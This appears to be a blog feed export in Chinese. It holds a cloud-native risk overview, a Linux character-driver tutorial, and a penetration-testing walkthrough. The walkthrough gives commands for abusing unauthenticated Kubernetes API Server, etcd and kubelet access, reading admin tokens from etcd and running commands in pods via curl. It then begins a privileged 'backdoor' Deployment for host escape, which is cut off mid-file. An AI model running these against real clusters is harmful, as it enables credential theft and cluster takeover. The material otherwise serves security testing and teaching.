<p><img src="../images/pic/%E4%BA%91%E5%8E%9F%E7%94%9F%E6%94%BB%E5%87%BB%E9%9D%A2.jpg"></p>
<p>容器云部分参考，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">容器逃逸</a>，<a href="https://shadowfl0w.github.io/%E5%AE%B9%E5%99%A8%E7%BC%96%E6%8E%92%E5%B9%B3%E5%8F%B0-Kubernetes%E5%AE%89%E5%85%A8/">容器编排平台-Kubernetes安全</a>，<a href="https://shadowfl0w.github.io/Kubernetes-API-Server-%E8%AE%A4%E8%AF%81%E4%B8%8E%E6%8E%88%E6%9D%83/">Kubernetes-API-Server-认证与授权</a></p>
<h2 id="云原生应用风险"><a href="#云原生应用风险" class="headerlink" title="云原生应用风险"></a>云原生应用风险</h2><h3 id="1-传统应用风险"><a href="#1-传统应用风险" class="headerlink" title="1. 传统应用风险"></a>1. 传统应用风险</h3><p>跑在容器云环境下得应用也避免不了OWASP top 10应用风险，</p>
<h3 id="2-API接口风险"><a href="#2-API接口风险" class="headerlink" title="2. API接口风险"></a>2. API接口风险</h3><p>虽然API接口风险也属于传统应用风险，但这个问题在云原生环境下更加突出，因为一个完整的应用被拆分成独立的模块，通过API接口进行交互，由于接口众多，导致管理困难，所有API接口风险是云原生应用的重大风险点</p>
<h3 id="3-Serverless风险"><a href="#3-Serverless风险" class="headerlink" title="3. Serverless风险"></a>3. Serverless风险</h3><p>Serverless应用属于云原生应用，它需要参照云厂商的模板编写代码。Serverless是由事件触发的，但是事件本身来源并不可控。其他的使用的共有或者私有Serverless平台本身也可能存在安全问题，现在很多公有云厂商提供的Serverless服务被用来做攻击，存在滥用的风险，比如用来做扫描，隐藏c2。还有就是编写的Serverless代码可能存在漏洞导致被利用。</p>
<h3 id="4-云原生应用架构安全"><a href="#4-云原生应用架构安全" class="headerlink" title="4. 云原生应用架构安全"></a>4. 云原生应用架构安全</h3><p>云原生应用一般采用微服务架构，微服务架构使用到的各种框架或者组件也是可能存在漏洞的，微服务下对认证和授权也是一大挑战，还有就是微服务的API管理，以及资产间隔离也是难点。</p>
<p>对云原生应用安全只做了简单的结束，后续有机会再详细介绍各种的攻击手法。</p>
]]></content>
      <categories>
        <category>云原生安全</category>
      </categories>
      <tags>
        <tag>云原生安全</tag>
      </tags>
  </entry>
  <entry>
    <title>字符设备驱动开发尝试</title>
    <url>/%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8%E5%BC%80%E5%8F%91%E5%B0%9D%E8%AF%95/</url>
    <content><![CDATA[<p>编写一个简单的字符设备驱动程序，并对其进行调试。</p>
<span id="more"></span>



<h2 id="1-开发一个简单的驱动"><a href="#1-开发一个简单的驱动" class="headerlink" title="1. 开发一个简单的驱动"></a>1. 开发一个简单的驱动</h2><ul>
<li>hellodev.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_MAX    (10)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK            (0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ERROR         (-1)</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> *<span class="title">gDev</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">gFile</span>;</span></span><br><span class="line"><span class="keyword">dev_t</span>  devNum;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> subDevNum = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> reg_major  =  <span class="number">232</span>;    </span><br><span class="line"><span class="keyword">int</span> reg_minor =   <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> *buffer;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello_open</span><span class="params">(struct inode *p, struct file *f)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_open\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">hello_write</span><span class="params">(struct file *f, <span class="keyword">const</span> <span class="keyword">char</span> __user *u, <span class="keyword">size_t</span> s, <span class="keyword">loff_t</span> *l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_write\r\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">ssize_t</span> <span class="title">hello_read</span><span class="params">(struct file *f, <span class="keyword">char</span> __user *u, <span class="keyword">size_t</span> s, <span class="keyword">loff_t</span> *l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;hello_read\r\n&quot;</span>);      </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//根据主次设备号生成dev number，这里在上方声明了是232和0</span></span><br><span class="line">    <span class="comment">//用来唯一标识一个设备，主设备号用来标识这类设备，次设备号用来标识这类设备里的不同设备</span></span><br><span class="line">    devNum = MKDEV(reg_major, reg_minor);</span><br><span class="line">    <span class="comment">//将设备号注册到内核里面，别人就不能用这个232,0设备号了。</span></span><br><span class="line">    <span class="comment">//subDevNum上面定义是1，表示从这里开始注册一个设备。</span></span><br><span class="line">    <span class="keyword">if</span>(OK == register_chrdev_region(devNum, subDevNum, <span class="string">&quot;helloworld&quot;</span>))&#123;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;register_chrdev_region ok \n&quot;</span>); </span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;register_chrdev_region error n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ERROR;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot; hello driver init \n&quot;</span>);</span><br><span class="line">    <span class="comment">//申请一个结构体，cdev代表一个字符设备</span></span><br><span class="line">    gDev = kzalloc(<span class="keyword">sizeof</span>(struct cdev), GFP_KERNEL);</span><br><span class="line">    <span class="comment">//申请一个file_operations结构体，file_operations代表对文件如何操作，read, write,open等操作</span></span><br><span class="line">    gFile = kzalloc(<span class="keyword">sizeof</span>(struct file_operations), GFP_KERNEL);</span><br><span class="line">    <span class="comment">//对gFile这个file_operations结构体指针进行赋值。</span></span><br><span class="line">    gFile-&gt;open = hello_open;</span><br><span class="line">    gFile-&gt;read = hello_read;</span><br><span class="line">    gFile-&gt;write = hello_write;</span><br><span class="line">    gFile-&gt;owner = THIS_MODULE;</span><br><span class="line">    <span class="comment">//建立字符设备与file_operations的联系</span></span><br><span class="line">    cdev_init(gDev, gFile);</span><br><span class="line">    <span class="comment">//建立字符设备与设备号的联系</span></span><br><span class="line">    cdev_add(gDev, devNum, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> __exit <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> 	printk(KERN_INFO <span class="string">&quot; hello driver exit \n&quot;</span>);</span><br><span class="line">    cdev_del(gDev);</span><br><span class="line">    kfree(gFile);</span><br><span class="line">    kfree(gDev);</span><br><span class="line">    unregister_chrdev_region(devNum, subDevNum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明入口函数是hello_init函数</span></span><br><span class="line">module_init(hello_init);</span><br><span class="line"><span class="comment">//声明驱动的删除函数</span></span><br><span class="line">module_exit(hello_exit);</span><br><span class="line"><span class="comment">//版权声明</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>module_init是加载模块执行的入口，加载后执行hello_init函数，进行一些字符设备操作。module_exit是删除驱动后执行的操作，这里执行hello_exit函数，做一些清理。</p>
<ul>
<li>Makefile</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ifneq</span> (<span class="variable">$(KERNELRELEASE)</span>,)</span><br><span class="line">obj-m := hellodev.o</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line"><span class="comment">#KDIR:=/home/jinxin/linux-4.9.229</span></span><br><span class="line"><span class="comment">#KDIR:= /lib/modules/4.4.0-31-generic/build</span></span><br><span class="line">KDIR := /lib/modules/`uname -r`/build</span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C <span class="variable">$(KDIR)</span> M=<span class="variable">$(PWD)</span></span><br><span class="line"><span class="section">clean:	</span></span><br><span class="line">	rm -rf *.o *.ko *.mod.c *.symvers *.c~ *~</span><br><span class="line"><span class="keyword">endif</span></span><br></pre></td></tr></table></figure>

<ul>
<li>首先判断KERNELRELEASE变量是不是空。第一次并没有定义这个变量，所以是空</li>
<li>是空就会进入else，拿到当前路径 </li>
<li> 然后获取Linux 内核代码目录，也可以自己指定下载的内核代码 </li>
<li>接下来是编译过程，执行make的时候，默认会调用all:  <ul>
<li>-C 表示进到内核里面，然后执行内核里面的Makefile，由于内核里的Makefile定义了KERNELRELEASE，所以就获取到了值。</li>
<li><code>M=$(PWD)</code> 又会跑到当前目录再次执行Makefile，这一次有KERNELRELEASE变量，所以会执行<code>obj-m := helloDev.o</code></li>
</ul>
</li>
<li><code>obj-m := helloDev.o</code>，这段代码是给内核的编译系统识别的，内核编译器会收集所以obj-m的binaray的文件。所以这里要把helloDev.c编译成helloDev.o，然后编译成helloDev.ko的驱动文件。</li>
</ul>
<p><strong>执行make</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">[root@debian hellloDev]<span class="comment"># make</span></span><br><span class="line">make -C <span class="regexp">/lib/m</span>odules<span class="regexp">/`uname -r`/</span>build M=<span class="regexp">/root/</span>code<span class="regexp">/cpp/</span>demo/hellloDev</span><br><span class="line">make[<span class="number">1</span>]: 进入目录“<span class="regexp">/usr/</span>src/linux-headers-<span class="number">4.19</span>.<span class="number">0</span>-<span class="number">17</span>-amd64”</span><br><span class="line">  CC [M]  <span class="regexp">/root/</span>code<span class="regexp">/cpp/</span>demo<span class="regexp">/hellloDev/</span>hellodev.o</span><br><span class="line">  Building modules, stage <span class="number">2</span>.</span><br><span class="line">  MODPOST <span class="number">1</span> modules</span><br><span class="line">  CC      <span class="regexp">/root/</span>code<span class="regexp">/cpp/</span>demo<span class="regexp">/hellloDev/</span>hellodev.mod.o</span><br><span class="line">  LD [M]  <span class="regexp">/root/</span>code<span class="regexp">/cpp/</span>demo<span class="regexp">/hellloDev/</span>hellodev.ko</span><br><span class="line">make[<span class="number">1</span>]: 离开目录“<span class="regexp">/usr/</span>src/linux-headers-<span class="number">4.19</span>.<span class="number">0</span>-<span class="number">17</span>-amd64</span><br></pre></td></tr></table></figure>





<p><strong>加载驱动</strong></p>
<p>清理内核日志</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">dmesg -c</span></span><br></pre></td></tr></table></figure>

<p>查看hello_init的打印信息</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@debian hellloDev</span>]<span class="meta"># insmod hellodev.ko</span></span><br><span class="line">[<span class="meta">root@debian hellloDev</span>]<span class="meta"># dmesg   </span></span><br><span class="line">[<span class="meta">714762.559553</span>] register_chrdev_region ok </span><br><span class="line">[<span class="meta">714762.559556</span>]  hello driver <span class="keyword">init</span></span><br></pre></td></tr></table></figure>



<p><strong>查看驱动</strong></p>
<figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@debian</span> hellloDev]<span class="meta"># lsmod | grep hello</span></span><br><span class="line">hellodev               <span class="number">16384</span>  <span class="number">0</span></span><br></pre></td></tr></table></figure>



<p><strong>删除驱动</strong></p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rmmod</span> hellodev.ko</span><br></pre></td></tr></table></figure>





<h2 id="2-测试驱动"><a href="#2-测试驱动" class="headerlink" title="2. 测试驱动"></a>2. 测试驱动</h2><ul>
<li>test.c</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/select.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DATA_NUM    (64)</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd, i;</span><br><span class="line">    <span class="keyword">int</span> r_len, w_len;</span><br><span class="line">    fd_set fdset;</span><br><span class="line">    <span class="keyword">char</span> buf[DATA_NUM]=<span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="built_in">memset</span>(buf,<span class="number">0</span>,DATA_NUM);</span><br><span class="line">    <span class="comment">//打开/dev/hello这个设备文件</span></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/hello&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\r\n&quot;</span>, fd);</span><br><span class="line">    <span class="keyword">if</span>(<span class="number">-1</span> == fd) &#123;</span><br><span class="line">      	perror(<span class="string">&quot;open file error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;	</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;open successe\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//如果打开成功，就写入一个字符串</span></span><br><span class="line">    w_len = write(fd, buf, DATA_NUM);</span><br><span class="line">    <span class="comment">//读出一个字符串</span></span><br><span class="line">	r_len = read(fd, buf, DATA_NUM);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d\r\n&quot;</span>, w_len, r_len);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, buf);</span><br><span class="line">	close(fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>编写一个应用层代码，打开/dev/hello设备，然后写入一个字符串，然后读出。</p>
<p>编译</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">gcc -o <span class="keyword">test</span> <span class="keyword">test</span>.c</span><br></pre></td></tr></table></figure>



<p>由于/dev/hello不存在，需要先创建</p>
<h3 id="2-1-创建设备文件"><a href="#2-1-创建设备文件" class="headerlink" title="2.1 创建设备文件"></a>2.1 创建设备文件</h3><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">mknod</span> /dev/hello c <span class="number">232</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>c 代表字符设备, 232 0 是上面写的字符驱动的主设备号与次设备号</p>
<p>设备文件和普通文件是有区别的（232,0），别的文件时文件长度，设备文件显示的是主设备号与次设备号</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">[root@debian code]# ls -l <span class="regexp">/dev/</span>hello           </span><br><span class="line">crw-r--r-- <span class="number">1</span> root root <span class="number">232</span>, <span class="number">0</span> <span class="number">8</span>月  <span class="number">26</span> <span class="number">10</span>:<span class="number">15</span> <span class="regexp">/dev/</span>hello</span><br></pre></td></tr></table></figure>





<h3 id="2-2-执行"><a href="#2-2-执行" class="headerlink" title="2.2 执行"></a>2.2 执行</h3><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">[root@debian test]<span class="comment"># ./test </span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="keyword">open</span> successe</span><br><span class="line"><span class="number">0</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>可以发现w_len, 和 r_len都是0</p>
<p>我们看一下dmesg</p>
<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@debian test</span>]<span class="meta"># dmesg   </span></span><br><span class="line">[<span class="meta">734839.236752</span>] hello_open</span><br><span class="line">[<span class="meta">734839.241614</span>] hello_write</span><br><span class="line">[<span class="meta">734839.241617</span>] hello_read</span><br><span class="line">[<span class="meta">734844.706949</span>] hello_open</span><br><span class="line">[<span class="meta">734844.709014</span>] hello_write</span><br><span class="line">[<span class="meta">734844.709017</span>] hello_read</span><br><span class="line">[<span class="meta">734949.565460</span>] hello_open</span><br><span class="line">[<span class="meta">734949.568214</span>] hello_write</span><br><span class="line">[<span class="meta">734949.568217</span>] hello_read</span><br></pre></td></tr></table></figure>

<p>可以发现我们执行test，却执行了我们编写的驱动里面的函数hello_open、hello_write、hello_read。原因就是在驱动中我们将file_operatations的open、read、write、owner指针进行了赋值，而应用层调用的open、read、write函数从用户空间再到内核空间，最后调用到file_operations到最后调用到open、read、write、owner指针。所以就执行了我们的驱动代码</p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>实战中碰到的一些云原生场景常见漏洞</title>
    <url>/%E5%AE%9E%E6%88%98%E4%B8%AD%E7%A2%B0%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BA%91%E5%8E%9F%E7%94%9F%E5%9C%BA%E6%99%AF%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>最近测试了一些真实的云原生场景，记录一下比较常见和危害较高的漏洞利用。</p>
<span id="more"></span>


<h2 id="1-Kubernetes-API-Server-未授权访问"><a href="#1-Kubernetes-API-Server-未授权访问" class="headerlink" title="1. Kubernetes API Server 未授权访问"></a>1. Kubernetes API Server 未授权访问</h2><h3 id="1-1-漏洞判断"><a href="#1-1-漏洞判断" class="headerlink" title="1.1 漏洞判断"></a>1.1 漏洞判断</h3><p>老版本的Kubernetes API Server端口是8080，通过HTTP即可访问，新版本Kubernetes API Server端口是6443，通过HTTPS访问。一般是这两个端口，但也不排除用80、8080等其他非标准端口。</p>
<p>如果存在未授权漏洞，则会出现如下类似页面</p>
<img src="../images/pics/容器云/9.jpg" style="zoom:50%;" /> 

<p>如何判断存在该漏洞呢，可以访问<code>/pods</code> 或者<code>/apis</code>等路径来确定。如果不存在该漏洞，则需要认证，访问就会出现<code>Unauthorized</code>，<code>forbidden: User \&quot;system:anonymous\&quot; cannot get path</code>等提示。</p>
<h3 id="1-2-漏洞利用"><a href="#1-2-漏洞利用" class="headerlink" title="1.2 漏洞利用"></a>1.2 漏洞利用</h3><p>如果存在Kubernetes API Server未授权访问，意味着可以控制整个集群，危害是相当大的。</p>
<p><strong>下载kubectl</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#https://kubernetes.io/docs/tasks/tools/install-kubectl-linux/</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">curl</span> <span class="literal">-LO</span> <span class="string">&quot;https://dl.k8s.io/release/<span class="variable">$</span>(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>尝试读取集群节点</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./kubectl</span> -s https:<span class="string">//ip</span><span class="function">:6443</span> <span class="params">--insecure-skip-tls-verify</span> get nodes</span><br></pre></td></tr></table></figure>

<p>如果读取节点成功，则就可以执行常规的kubectl命令。比如查看pods、部署特权容器等等。<font color="red">如果是https，需要认证，如果是开了匿名访问，随便输入账号密码就可以认证成功</font></p>
<h2 id="2-ETCD未授权访问"><a href="#2-ETCD未授权访问" class="headerlink" title="2. ETCD未授权访问"></a>2. ETCD未授权访问</h2><p>etcd端口默认是2379，如果配置不当则存在未授权访问，如果存在未授权访问我们可以获取到集群的凭证等重要信息，进而控制集群</p>
<h3 id="2-1-漏洞判断"><a href="#2-1-漏洞判断" class="headerlink" title="2.1 漏洞判断"></a>2.1 漏洞判断</h3><p><strong>安装客户端工具</strong></p>
<p>直接在github上下载，解压后里面就有etcdctl</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/etcd-io/</span>etcd/releases</span><br></pre></td></tr></table></figure>

<p>判断是否存在未授权访问我们可以执行如下命令</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">./etcdctl <span class="attribute">--insecure-transport</span>=<span class="literal">false</span> --insecure-skip-tls-verify <span class="attribute">--endpoints</span>=ip:port <span class="builtin-name">get</span> / --prefix</span><br></pre></td></tr></table></figure>



<h3 id="2-2-漏洞利用"><a href="#2-2-漏洞利用" class="headerlink" title="2.2 漏洞利用"></a>2.2 漏洞利用</h3><p>漏洞利用，我们可以读取kubernetes的 kube-system admin账号的token，从而接管集群</p>
<p><strong>查看有哪些secrets</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./etcdctl</span> <span class="params">--insecure-transport=false</span> <span class="params">--insecure-skip-tls-verify</span> <span class="params">--endpoints=ip</span><span class="function">:port</span> get / <span class="params">--prefix</span> <span class="params">--keys-only</span> | grep <span class="string">/secrets/</span></span><br></pre></td></tr></table></figure>

<p><strong>如果存在/registry/secrets/kube-system/admin-user-token-xxx，我们就可以读出token</strong></p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">./etcdctl <span class="attribute">--insecure-transport</span>=<span class="literal">false</span> --insecure-skip-tls-verify <span class="attribute">--endpoints</span>=ip:port <span class="builtin-name">get</span> /registry/secrets/kube-system/admin-user-token-xxx</span><br></pre></td></tr></table></figure>

<p><strong>通过token就可以使用kubectl接管集群了</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">kubectl <span class="params">--insecure-skip-tls-verify</span> -s https:<span class="string">//ip</span><span class="function">:6443</span> <span class="params">--token</span> <span class="string">&quot;$toekn&quot;</span> get nodes</span><br></pre></td></tr></table></figure>





<h2 id="3-Kubelet未授权访问"><a href="#3-Kubelet未授权访问" class="headerlink" title="3. Kubelet未授权访问"></a>3. Kubelet未授权访问</h2><p>Kubelet 是与master中的kube-apiserver做交互的组件，接受master发送的消息，然后做对应处理。10250端口是kubelet与apiserver进行通信的主要端口，所以我们在做测试的时候主要探测10250端口，此外还有10255端口可以查看Pods信息等。</p>
<h3 id="3-1-10255端口kubelet未授权访问"><a href="#3-1-10255端口kubelet未授权访问" class="headerlink" title="3.1 10255端口kubelet未授权访问"></a>3.1 10255端口kubelet未授权访问</h3><p>可以通过访问10255端口的<code>/pods</code>路径来确定是否存在该漏洞</p>
<img src="../images/pics/容器云/10.jpg" style="zoom:100%;" /> 



<h3 id="3-2-10250端口未授访问导致命令执行"><a href="#3-2-10250端口未授访问导致命令执行" class="headerlink" title="3.2 10250端口未授访问导致命令执行"></a>3.2 10250端口未授访问导致命令执行</h3><p>同样我们可以访问10250的<code>/pods</code>路径来判断是否存在该漏洞</p>
<p>我们可以使用kubeletctl工具：<a href="https://github.com/cyberark/kubeletctl%EF%BC%8C%E6%B3%A8%E6%84%8F%E5%8C%BA%E5%88%86%E4%B8%8D%E6%98%AFkubectl%EF%BC%8Ckubectl%E7%94%A8%E4%BA%8E%E4%B8%8Eapi">https://github.com/cyberark/kubeletctl，注意区分不是kubectl，kubectl用于与api</a> server交互，kubeletctl用于与kubelet服务交互</p>
<p><strong>使用这个工具我们可以执行如下命令查看POD  NAMESPACE CONTAINERS</strong></p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="string">./kubeletctl_linux_amd64</span> pods -s ip <span class="params">--port</span> 10250</span><br></pre></td></tr></table></figure>

<p>比如我们查到的信息如下</p>
<table>
<thead>
<tr>
<th>POD</th>
<th>NAMESPACE</th>
<th>CONTAINERS</th>
</tr>
</thead>
<tbody><tr>
<td>trace-a-lb-9fdfa</td>
<td>kube-system</td>
<td>trace-a-df</td>
</tr>
<tr>
<td>calico-node-g8ack</td>
<td>kube-system</td>
<td>calico-node<br>install-cni</td>
</tr>
</tbody></table>
<p><strong>通过查到的信息，构造使用如下命令可以在指定Pod里执行命令</strong></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -k https:<span class="regexp">//i</span>p:<span class="number">10250</span><span class="regexp">/run/</span><span class="variable">$NAMESPACE</span><span class="regexp">/$POD/</span><span class="variable">$CONTAINERS</span> -d <span class="string">&quot;cmd=whoami&quot;</span> --insecure</span><br></pre></td></tr></table></figure>

<p>也即(这里我们使用的容器是install-cni，而不是calico-node，一个pod可以对应多个容器)</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">curl -k https:<span class="regexp">//i</span>p:<span class="number">10250</span><span class="regexp">/run/</span>kube-system<span class="regexp">/calico-node-g8ack/i</span>nstall-cni -d <span class="string">&quot;cmd=whoami&quot;</span> --insecure</span><br></pre></td></tr></table></figure>

<p>进入容器后，就可以读取token，使用env命令获取api server地址，然后使用token访问api server。</p>
<h2 id="4-控制集群"><a href="#4-控制集群" class="headerlink" title="4.  控制集群"></a>4.  控制集群</h2><p>除了kubelet未授权访问获取到的token权限较低外，Kubernetes API   Server未授权访问以及etcd未授权访问都可以通过后续操作控制集群，方式如下。</p>
<p>我们可以部署一个特权容器，然后逃逸到宿主机上，我们可以将部署的容器的污点调到master上，从而将特权容器部署到master节点上，逃逸出去就直接获取到了master节点的权限。</p>
<h3 id="4-1-部署到普通节点上"><a href="#4-1-部署到普通节点上" class="headerlink" title="4.1 部署到普通节点上"></a>4.1 部署到普通节点上</h3><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">kubectl -s https:<span class="string">//ip</span><span class="function">:6443</span> <span class="params">--insecure-skip-tls-verify</span> apply -f backdoor-deployment <span class="string">.yaml</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果是token也可以使用kubectl --token</span></span><br></pre></td></tr></table></figure>

<ul>
<li>backdoor-deployment.yaml</li>
</ul>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">apiVersion:</span> <span class="string">apps/v1</span></span><br><span class="line"><span class="attr">kind:</span> <span class="string">Deployment</span></span><br><span class="line"><span class="attr">metadata:</span></span><br><span class="line">  <span class="attr">name:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">labels:</span></span><br><span class="line">    <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line"><span class="attr">spec:</span></span><br><span class="line">  <span class="attr">replicas:</span> <span class="number">1</span></span><br><span class="line">  <span class="attr">selector:</span></span><br><span class="line">    <span class="attr">matchLabels:</span></span><br><span class="line">      <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">  <span class="attr">template:</span></span><br><span class="line">    <span class="attr">metadata:</span></span><br><span class="line">      <span class="attr">labels:</span></span><br><span class="line">        <span class="attr">app:</span> <span class="string">backdoor-deployment</span></span><br><span class="line">    <span class="attr">spec:</span></span><br><span class="line">      <span class="attr">containers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">nginx</span></span><br><span class="line">        <span class="attr">image:</span> <span class="string">nginx:1.14.2</span></span><br><span class="line">        <span class="attr">ports:</span></span><br><span class="line">        <span class="attr">securityContext:</span></span><br><span class="line">          <span class="attr">privileged:</span> <span class="literal">true</span></span><br><span class="line">          <span class="attr">capabilities:</span></span><br><span class="line">            <span class="attr">add:</span></span><br><span class="line">            <span class="bullet">-</span> <span class="string">SYS_ADMIN</span></span><br><span class="line">        <span 